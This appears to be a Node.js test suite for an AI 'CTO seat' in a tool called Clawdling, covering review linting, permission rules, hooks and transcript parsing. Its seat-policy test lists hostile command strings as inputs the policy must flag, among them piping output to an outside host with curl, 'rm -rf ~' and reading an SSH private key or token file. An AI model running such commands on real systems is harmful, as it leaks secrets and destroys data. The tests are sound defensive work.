// The CTO seat (1.7), pure parts: receipt ids, agent text, the receipt index, the review lint, the
// seat's permissions (POSIX and Windows), its launch settings, and reading its transcripts.
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { test } from 'node:test';
import { ReceiptIndex, agentBlock, agentText, citedIds, collectReceipts, receiptId } from '../../server/receipts.js';
import { lintReview, parseReview } from '../../server/review-lint.js';
import { ctoPermissions, ctoSettingsText } from '../../server/org.js';
import { Cto, ctoLaunchSettings, deliveryTarget, isoWeekRange, scanTranscript } from '../../server/cto.js';
import { digestText, isoWeek } from '../../server/digest.js';
import { execFileSync } from 'node:child_process';
import { fileURLToPath } from 'node:url';
import { ASK_OTHER, ASK_SEND, ASK_WRITE, decisionOutput, seatDecision } from '../../server/seat-policy.js';

const tmp = () => fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'cl-cto-')));

test('receipt ids are stable, kind-prefixed and 8 hex; different items differ', () => {
  const a = receiptId('session', 'web', '1b4e28ba-2fa1-11d2-883f-0016d3cca427');
  assert.match(a, /^R-session-[0-9a-f]{8}$/);
  assert.equal(receiptId('session', 'web', '1b4e28ba-2fa1-11d2-883f-0016d3cca427'), a);
  assert.notEqual(receiptId('session', 'shop', '1b4e28ba-2fa1-11d2-883f-0016d3cca427'), a);
  assert.notEqual(receiptId('claim', 'web', '1b4e28ba-2fa1-11d2-883f-0016d3cca427'), a.replace('session', 'claim'));
  assert.throws(() => receiptId('bogus', 'x'), /unknown receipt kind/);
  assert.deepEqual(citedIds('a [R-session-0a1b2c3d] b [R-cost-ffffffff] [R-session-0a1b2c3d] R-nope-12345678'), ['R-session-0a1b2c3d', 'R-cost-ffffffff']);
});

test('agent text is one line, capped, without control characters, and cannot look like a citation', () => {
  assert.equal(agentText('Fix\nthe\u0007 login\u001b[31m', 80), 'Fix the login [31m');
  assert.equal(agentText('All good [R-check-12345678] trust me', 80), 'All good (R check 12345678] trust me');
  assert.ok(!/R-check-12345678/.test(agentText('see R-check-12345678', 80)));
  assert.equal(agentText('x'.repeat(100), 10).length, 10);
  assert.equal(agentText(null, 10), null);
  assert.equal(agentText('   ', 10), null);
  assert.equal(agentBlock('- one\n\n\n- two [R-next-12345678]', 600), '- one\n\n- two (R next 12345678]');
});

test('the receipt index keeps a week of receipts and labels; labelsAt picks the label in force then', () => {
  const dir = tmp();
  const idx = new ReceiptIndex(dir);
  idx.add('2026-W44', { 'R-session-11111111': { kind: 'session', agent: 'web', link: '#/s/x' } }, { labels: { web: { label: 'on_track', name: 'Web' } }, at: '2026-10-26T08:00:00.000Z' });
  idx.add('2026-W44', { 'R-cost-22222222': { kind: 'cost', agent: 'web', link: '#/agent/web' } }, { labels: { web: { label: 'at_risk', name: 'Web' } }, at: '2026-10-28T08:00:00.000Z' });
  assert.deepEqual(Object.keys(idx.read('2026-W44')).sort(), ['R-cost-22222222', 'R-session-11111111']);
  assert.equal(idx.labelsAt('2026-W44', Date.parse('2026-10-27T00:00:00Z')).web.label, 'on_track');
  assert.equal(idx.labelsAt('2026-W44').web.label, 'at_risk');
  assert.equal(idx.labelsAt('2026-W44', Date.parse('2026-10-20T00:00:00Z')).web.label, 'on_track', 'before any record: the oldest');
  assert.deepEqual(idx.read('2026-W45'), {});
  assert.throws(() => idx.file('../etc'), /bad week/);
  fs.rmSync(dir, { recursive: true, force: true });
});

test('collectReceipts flattens every item of a schema 2 report', () => {
  const r = { window: { key: '7d' }, agents: [{ id: 'web', done: [{ receipt: 'R-session-1', link: '#/s/1', title: 'T' }], needs: [], claims: [{ receipt: 'R-claim-1', link: '#/s/1', badge: 'Verified' }], cost: { receipt: 'R-cost-1', link: '#/agent/web' }, next: { receipt: 'R-next-1', link: '#/agent/web/memory' }, checks: { last: { receipt: 'R-check-1', ok: false, link: '#/agent/web/checkup' } }, checkup: { last: null, previous: null }, cheaperModel: { last: null } }] };
  const all = collectReceipts(r);
  assert.deepEqual(Object.keys(all).sort(), ['R-check-1', 'R-claim-1', 'R-cost-1', 'R-next-1', 'R-session-1']);
  assert.equal(all['R-check-1'].label, 'ship check failed');
});

const REVIEW = `# CTO review, 2026-W44
Headline: Shop needs you; Website shipped.
## Website: On track
- Finished the pricing page [R-session-aaaaaaaa]
- Its "done" claim was verified [R-claim-bbbbbbbb]
## Shop: On track
- Override: the failing test is a known flake [R-claim-cccccccc]
- Usage doubled [R-cost-dddddddd]
## Blog: Stalled
- Nothing finished in a week.
- Wrong id [R-session-00000000]
## Decisions
1. Shop: what next?
   - Ask Shop to fix the test
   - Leave Shop for now
2. Blog: pause it?
`;
const RECEIPTS = Object.fromEntries(['R-session-aaaaaaaa', 'R-claim-bbbbbbbb', 'R-claim-cccccccc', 'R-cost-dddddddd'].map((id) => [id, { kind: id.split('-')[1] }]));
const LABELS = { website: { label: 'on_track', name: 'Website' }, shop: { label: 'at_risk', name: 'Shop' }, blog: { label: 'stalled', name: 'Blog' }, health: { label: 'quiet', name: 'Health' } };

test('parseReview: title, headline, sections with labels, bullets, decisions with options', () => {
  const r = parseReview(REVIEW);
  assert.equal(r.title, 'CTO review, 2026-W44');
  assert.equal(r.headline, 'Shop needs you; Website shipped.');
  assert.deepEqual(r.sections.map((s) => [s.name, s.label, s.bullets.length]), [['Website', 'on_track', 2], ['Shop', 'on_track', 2], ['Blog', 'stalled', 2]]);
  assert.deepEqual(r.decisions.map((d) => [d.n, d.text, d.options.length]), [[1, 'Shop: what next?', 2], [2, 'Blog: pause it?', 0]]);
  // A wrapped bullet continues; a fenced block is not parsed.
  const w = parseReview('## Web: On track\n- A long finding that\n  wraps here [R-session-aaaaaaaa]\n```\n- not a bullet\n```\n');
  assert.equal(w.sections[0].bullets.length, 1);
  assert.match(w.sections[0].bullets[0].text, /wraps here \[R-session-aaaaaaaa\]$/);
});

test('lint: cited, uncited, a cited id that does not exist, an override with its reason, a missing section', () => {
  const l = lintReview(REVIEW, { receipts: RECEIPTS, labels: LABELS });
  assert.equal(l.findings, 6);
  assert.equal(l.cited, 4);
  assert.deepEqual(l.uncited.map((u) => u.text), ['Nothing finished in a week.']);
  assert.deepEqual(l.unknown.map((u) => u.id), ['R-session-00000000']);
  const shop = l.sections.find((s) => s.agent === 'shop');
  assert.equal(shop.state, 'overridden');
  assert.equal(shop.computed, 'at_risk');
  assert.equal(shop.why, 'the failing test is a known flake [R-claim-cccccccc]');
  assert.equal(l.sections.find((s) => s.agent === 'website').state, 'match');
  assert.deepEqual(l.missing.map((m) => m.agent), ['health']);
  assert.equal(l.clean, false);
  assert.equal(l.summary, '1 uncited · 1 citation to a receipt that does not exist · 1 label overridden by the CTO');
});

test('lint: a clean review says "N findings, all cited"; a changed label with no reason is flagged', () => {
  const clean = lintReview('# CTO review\nHeadline: ok\n## Website: On track\n- Shipped [R-session-aaaaaaaa]\n## Health: Quiet\n- Nothing this week [R-cost-dddddddd]\n', { receipts: RECEIPTS, labels: { website: LABELS.website, health: LABELS.health } });
  assert.equal(clean.clean, true);
  assert.equal(clean.summary, '2 findings, all cited');
  const bad = lintReview('## Shop: On track\n- Fine [R-cost-dddddddd]\n', { receipts: RECEIPTS, labels: { shop: LABELS.shop } });
  assert.equal(bad.sections[0].state, 'mismatch');
  assert.equal(bad.clean, false);
  assert.match(bad.summary, /1 section with a label Clawdling did not compute/);
  const unknownAgent = lintReview('## Nobody: Quiet\n- x [R-cost-dddddddd]\n', { receipts: RECEIPTS, labels: {} });
  assert.equal(unknownAgent.sections[0].state, 'unknown_agent');
  assert.equal(lintReview('', {}).summary, 'No findings yet');
});

test('the seat\'s permissions: report and ls allowed, send and spawn ASK, the web and its own files denied', () => {
  const p = ctoPermissions({ dir: '/home/lou/org/cto', home: '/home/lou/org', platform: 'linux' });
  assert.deepEqual(p.allow, ['Bash(clawdling report)', 'Bash(clawdling report *)', 'Bash(clawdling ls)', 'Bash(clawdling ls *)', 'Read(//home/lou/org/cto/**)', 'Write(//home/lou/org/cto/reviews/**)', 'Edit(//home/lou/org/cto/reviews/**)']);
  assert.deepEqual(p.ask, ['Bash(clawdling send *)', 'Bash(clawdling spawn *)']);
  for (const d of ['WebFetch', 'WebSearch', 'Edit(//home/lou/org/cto/CLAUDE.md)', 'Write(//home/lou/org/cto/.claude/**)', 'Read(//home/lou/org/.clawdling/**)', 'Edit(//home/lou/org/.clawdling/**)']) assert.ok(p.deny.includes(d), d);
  assert.equal(p.fileRules, true);
  // Nothing that sends, creates or rewires anything is ever allowed.
  for (const r of p.allow) assert.ok(!/send|spawn|new|end|import|remote|init|\*\)$/.test(r) || /report \*|ls \*|\/\*\*\)/.test(r), r);
});

test('on Windows the same command rules cover PowerShell, and paths are matched in POSIX form', () => {
  const p = ctoPermissions({ dir: 'C:\\Users\\lou\\org\\cto', home: 'C:\\Users\\lou\\org', platform: 'win32' });
  assert.ok(p.allow.includes('PowerShell(clawdling report *)'));
  assert.ok(p.ask.includes('PowerShell(clawdling send *)') && p.ask.includes('PowerShell(clawdling spawn *)'));
  assert.ok(p.allow.includes('Write(//c/Users/lou/org/cto/reviews/**)'), JSON.stringify(p.allow));
});

test('a folder path with rule syntax gets no file rules (the CTO then asks before writing), never a broken rule', () => {
  const p = ctoPermissions({ dir: '/home/lou/my (org)/cto', home: '/home/lou/my (org)', platform: 'linux' });
  assert.equal(p.fileRules, false);
  assert.ok(!p.allow.some((r) => r.includes('(org)')));
  assert.deepEqual(p.ask, ['Bash(clawdling send *)', 'Bash(clawdling spawn *)']);
  assert.ok(p.deny.includes('WebFetch'));
  assert.equal(JSON.parse(ctoSettingsText({ dir: '/home/lou/org/cto', home: '/home/lou/org', platform: 'linux' })).permissions.ask.length, 2);
});

test('launch settings: Clawdling\'s hooks, a tool hook for every tool, and the seat\'s permissions', () => {
  const s = ctoLaunchSettings({ nodePath: '/usr/bin/node', hookScript: '/opt/cl/bin/clawdling-hook.js', stopFailure: true, home: '/home/lou/org', dir: '/home/lou/org/cto', platform: 'linux' });
  for (const ev of ['SessionStart', 'UserPromptSubmit', 'Stop', 'StopFailure', 'Notification', 'SessionEnd']) assert.ok(s.hooks[ev], ev);
  assert.ok(s.hooks.PreToolUse.length === 1 && s.hooks.PreToolUse[0].matcher === undefined);
  assert.match(s.hooks.PreToolUse[0].hooks[0].command, / PreToolUse cto$/, 'the seat\'s PreToolUse answers for it');
  assert.doesNotMatch(s.hooks.PostToolUse[0].hooks[0].command, / cto$/);
  const w = ctoLaunchSettings({ nodePath: 'C:\\node\\node.exe', hookScript: 'C:\\cl\\bin\\clawdling-hook.js', stopFailure: true, home: 'C:\\Users\\lou\\org', dir: 'C:\\Users\\lou\\org\\cto', platform: 'win32' });
  assert.deepEqual(w.hooks.PreToolUse[0].hooks[0].args.slice(-2), ['PreToolUse', 'cto']);
  assert.ok(s.hooks.PostToolUse[0].matcher === undefined);
  assert.deepEqual(s.permissions.ask, ['Bash(clawdling send *)', 'Bash(clawdling spawn *)']);
  assert.ok(!s.permissions.allow.includes('Bash(clawdling send *)'), 'the shared allow-list is not inherited');
});

test('scanTranscript: sends with what became of them (sent, declined, failed, pending), decisions with answers', () => {
  const dir = tmp();
  const f = path.join(dir, 't.jsonl');
  const line = (o) => JSON.stringify(o);
  const use = (id, name, input) => line({ type: 'assistant', timestamp: '2026-10-28T09:00:00Z', message: { content: [{ type: 'tool_use', id, name, input }] } });
  const res = (id, content, extra = {}) => line({ type: 'user', message: { content: [{ type: 'tool_result', tool_use_id: id, content, ...extra }] }, ...(extra.tur ? { toolUseResult: extra.tur } : {}) });
  fs.writeFileSync(f, [
    use('t1', 'Bash', { command: 'clawdling report --all --json' }),
    res('t1', '{}'),
    use('q1', 'AskUserQuestion', { questions: [{ question: 'Shop: next?', options: [{ label: 'Ask Shop to fix it' }, { label: 'Leave it' }] }] }),
    line({ type: 'user', toolUseResult: { answers: { 'Shop: next?': 'Ask Shop to fix it' } }, message: { content: [{ type: 'tool_result', tool_use_id: 'q1', content: 'answered' }] } }),
    use('s1', 'Bash', { command: 'clawdling send 1a2b3c4d "Please fix the test."' }),
    res('s1', 'Sent to shop session 1a2b3c4d.'),
    use('s2', 'Bash', { command: 'clawdling spawn blog "Pause for now."' }),
    res('s2', "The user doesn't want to proceed with this tool use. The tool use was rejected.", { is_error: true }),
    use('s3', 'PowerShell', { command: 'clawdling send zzzz "x"' }),
    res('s3', 'no session matches "zzzz"', { is_error: true }),
    use('s4', 'Bash', { command: 'clawdling spawn web "Go."' }),
    'not json',
  ].join('\n'));
  const r = scanTranscript(f);
  assert.deepEqual(r.deliveries.map((d) => [d.verb, d.state]), [['send', 'sent'], ['spawn', 'declined'], ['send', 'failed'], ['spawn', 'pending']]);
  assert.equal(r.decisions.length, 1);
  assert.equal(r.decisions[0].state, 'answered');
  assert.deepEqual(r.decisions[0].answers, { 'Shop: next?': 'Ask Shop to fix it' });
  assert.deepEqual(r.decisions[0].questions[0].options, ['Ask Shop to fix it', 'Leave it']);
  assert.deepEqual(scanTranscript(path.join(dir, 'missing.jsonl')), { deliveries: [], decisions: [] });
  assert.equal(deliveryTarget('clawdling send 1a2b3c4d "x"'), '1a2b3c4d');
  assert.equal(deliveryTarget('clawdling spawn blog "x y"'), 'blog');
  assert.equal(deliveryTarget('ls'), null);
  fs.rmSync(dir, { recursive: true, force: true });
});

test('isoWeekRange starts on Monday at midnight, local time', () => {
  const thu = new Date(2026, 9, 29, 15, 0, 0).getTime(); // Thursday 29 Oct 2026
  const r = isoWeekRange(thu);
  assert.equal(new Date(r.start).getDay(), 1);
  assert.equal(new Date(r.start).getHours(), 0);
  assert.equal(r.list.length, 4);
});

test('the Monday report\'s CTO line: only when turned on; names its week; this or last week only; links removed', () => {
  const dir = tmp();
  const NOW = Date.now();
  const stub = (headlineOn, headline, waiting, week = isoWeek(NOW)) => {
    const c = new Cto({ paths: { rt: dir, home: dir }, org: { cto: () => ({ dir }) }, sessions: { list: () => [] }, reports: {}, now: () => NOW });
    fs.writeFileSync(path.join(dir, 'cto.json'), JSON.stringify({ headline_in_digest: headlineOn }));
    c.latest = () => ({ week, headline, decisions_waiting: waiting });
    return c.digestLine();
  };
  const wk = Number(isoWeek(NOW).slice(6));
  assert.equal(stub(false, 'Shop needs you', 3), null, 'off by default');
  assert.equal(stub(true, 'Shop needs you', 3), `CTO, week ${wk}: Shop needs you. 3 decisions waiting in Clawdling.`);
  assert.equal(stub(true, 'See https://evil.example/x now!', 0), `CTO, week ${wk}: See [link removed] now!`);
  assert.equal(stub(true, null, 1), `CTO, week ${wk}: 1 decision waiting in Clawdling.`);
  assert.equal(stub(true, null, 0), null);
  assert.match(stub(true, 'Last week', 0, isoWeek(NOW - 7 * 86400000)), /^CTO, week \d+: Last week\.$/);
  assert.equal(stub(true, 'Old news', 0, isoWeek(NOW - 21 * 86400000)), null, 'a review three weeks old is not news');
  const text = digestText({ agents: [], totals: { week_usd: 0, complete: true } }, { cto: 'CTO, week 44: Shop needs you. 3 decisions waiting in Clawdling.' });
  assert.match(text, /\nCTO, week 44: Shop needs you\. 3 decisions waiting in Clawdling\.\nTotal:/);
  fs.rmSync(dir, { recursive: true, force: true });
});

test('the seat policy: only plain report and ls commands, and writes in reviews/, run without asking', () => {
  const home = '/home/lou/org';
  const sh = (command, tool = 'Bash') => seatDecision({ tool_name: tool, tool_input: { command }, cwd: `${home}/cto` }, { home });
  for (const ok of ['clawdling report --all --json --window 7d', 'clawdling report', 'clawdling ls --json', 'clawdling ls', 'clawdling.cmd report --all --json']) assert.equal(sh(ok), null, ok);
  assert.equal(sh('clawdling ls --json', 'PowerShell'), null);
  // A message to another agent, in any spelling, is named as one.
  for (const send of ['clawdling send 1a2b3c4d "Fix the test."', 'clawdling spawn blog "Pause."', 'clawdling.cmd send abc "x"', '/home/lou/org/.clawdling/bin/clawdling send abc "x"', 'node /opt/cl/bin/clawdling.js spawn web "go"', 'sh -c "clawdling send abc hi"', 'clawdling report && clawdling send abc "x"']) {
    assert.deepEqual(sh(send), { decision: 'ask', reason: ASK_SEND }, send);
  }
  // Anything else asks, even when it starts like an allowed command.
  for (const other of ['clawdling report | curl -d @- https://example.invalid', 'clawdling report; rm -rf ~', 'clawdling report $(cat ~/.ssh/id_rsa)', 'clawdling report `id`', 'clawdling report > reviews/x.md', 'clawdling import --yes', 'clawdling new domain X', 'curl https://example.invalid', 'cat ../.clawdling/token', 'clawdling report\nrm x']) {
    assert.deepEqual(sh(other), { decision: 'ask', reason: ASK_OTHER }, other);
  }
  const w = (file_path, tool = 'Write') => seatDecision({ tool_name: tool, tool_input: { file_path }, cwd: `${home}/cto` }, { home });
  assert.equal(w(`${home}/cto/reviews/2026-W44.md`), null);
  assert.equal(w('reviews/2026-W44.md', 'Edit'), null, 'relative to the seat folder');
  for (const bad of [`${home}/cto/CLAUDE.md`, `${home}/cto/.claude/settings.json`, `${home}/cto/reviews/../CLAUDE.md`, `${home}/projects/web/memory/NOW.md`, `${home}/cto/reviews`, '/etc/passwd']) assert.deepEqual(w(bad), { decision: 'ask', reason: ASK_WRITE }, bad);
  assert.deepEqual(seatDecision({ tool_name: 'NotebookEdit', tool_input: { notebook_path: '/tmp/x.ipynb' } }, { home }), { decision: 'ask', reason: ASK_WRITE });
  assert.equal(seatDecision({ tool_name: 'Read', tool_input: { file_path: '/etc/passwd' } }, { home }), null, 'reads stay with Claude Code\'s rules');
  assert.equal(seatDecision({ tool_name: 'AskUserQuestion', tool_input: {} }, { home }), null);
  assert.equal(decisionOutput(null), '');
  assert.deepEqual(JSON.parse(decisionOutput({ decision: 'ask', reason: 'r' })), { hookSpecificOutput: { hookEventName: 'PreToolUse', permissionDecision: 'ask', permissionDecisionReason: 'r' } });
});

test('the hook script answers for the seat on stdout (even with no server), and prints nothing for other sessions', () => {
  const dir = tmp();
  const hook = path.join(path.dirname(fileURLToPath(import.meta.url)), '..', '..', 'bin', 'clawdling-hook.js');
  const run = (args, payload, env = {}) => execFileSync(process.execPath, [hook, ...args], { input: JSON.stringify(payload), encoding: 'utf8', env: { ...process.env, CLAWDLING_SID: '1b4e28ba-2fa1-11d2-883f-0016d3cca427', CLAWDLING_HOME: dir, CLAWDLING_PORT: '9', ...env }, timeout: 10000 });
  const send = { tool_name: 'Bash', tool_input: { command: 'clawdling send abc "Fix it."' }, tool_use_id: 'toolu_1', cwd: path.join(dir, 'cto') };
  const out = JSON.parse(run(['PreToolUse', 'cto'], send).trim());
  assert.equal(out.hookSpecificOutput.permissionDecision, 'ask');
  assert.equal(run(['PreToolUse', 'cto'], { ...send, tool_input: { command: 'clawdling ls --json' } }), '');
  assert.equal(run(['PreToolUse'], send), '', 'an ordinary session: no decision');
  assert.equal(run(['PostToolUse', 'cto'], send), '');
  fs.rmSync(dir, { recursive: true, force: true });
});
